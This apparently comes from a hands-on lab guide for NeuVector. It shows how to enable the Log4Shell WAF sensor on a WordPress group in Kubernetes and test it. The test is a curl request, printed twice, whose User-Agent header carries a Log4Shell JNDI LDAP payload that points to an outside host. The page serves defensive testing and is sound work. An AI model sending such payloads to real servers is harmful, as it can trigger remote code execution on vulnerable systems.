+++
title = "Create and test WAF rule"
weight = 24
+++

NeuVector's deep packet inspection also allow to scan and filter incoming and outgoing traffic with WAF (Web Application Firewall) and DLP (Data Loss Prevention) sensors.

Go to **Policy > WAF Sensors** to see the already pre-configured sensors. Here you can also activate your own. You can find more information at [DLP & WAF Sensors](https://open-docs.neuvector.com/policy/dlp).

In this step, we will test the `log4shell` sensor.

The following request contains a Log4Shell exploit:

```ctr:kubernetes01
curl -X POST -H "Content-Type: application/json" \
  -H "User-Agent: \${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}" \
  -d 'foo=bar' \
  http://wordpress.${vminfo:Kubernetes01:public_ip}.sslip.io
```

Without a configured WAF sensor, the request will work.

Next, create a WAF rule:

* Go to **Policy > Groups** and choose the `nv.wordpress.wordpress` group.
* Go to the **WAF** tab
* Click on the edit button
* Choose the Log4Shell WAF sensor
* Click apply
* Set the WAF status toggle to **Enabled**

If you execute the same request now:

```ctr:kubernetes01
curl -X POST -H "Content-Type: application/json" \
  -H "User-Agent: \${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}" \
  -d 'foo=bar' \
  http://wordpress.${vminfo:Kubernetes01:public_ip}.sslip.io
```

the request will be blocked. NeuVector will also alert you at **Notifications > Security Events**.
